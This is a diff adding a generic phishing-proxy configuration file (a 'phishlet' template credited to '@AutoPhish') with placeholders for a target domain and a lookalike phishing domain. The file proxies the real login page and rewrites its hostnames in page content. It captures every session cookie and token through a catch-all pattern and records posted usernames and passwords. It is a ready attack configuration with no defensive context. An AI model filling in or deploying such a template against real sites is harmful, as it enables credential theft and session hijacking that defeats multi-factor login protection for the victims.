@@ -1,0 +1,24 @@
+name: "{name}"
+author: "@AutoPhish"
+min_ver: "3.0.0"
+proxy_hosts:
+  - {phish_sub: "", orig_sub: "{subdomain}", domain: "{domain}", session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: "{domain}", orig_sub: "{subdomain}", domain: "{domain}", search: "{subdomain}.{domain}", replace: "{phish_domain}", mimes: ["text/html", "application/json", "application/javascript"]}
+auth_tokens:
+  - domain: "{domain}"
+    keys: ["session_id", "auth_token", "SID", "JSESSIONID", ".*"]
+credentials:
+  username:
+    key: "username"
+    search: ".*"
+    type: "post"
+  password:
+    key: "password"
+    search: ".*"
+    type: "post"
+login:
+  domain: "{subdomain}.{domain}"
+  path: "/"
+landing_path:
+  - "/"
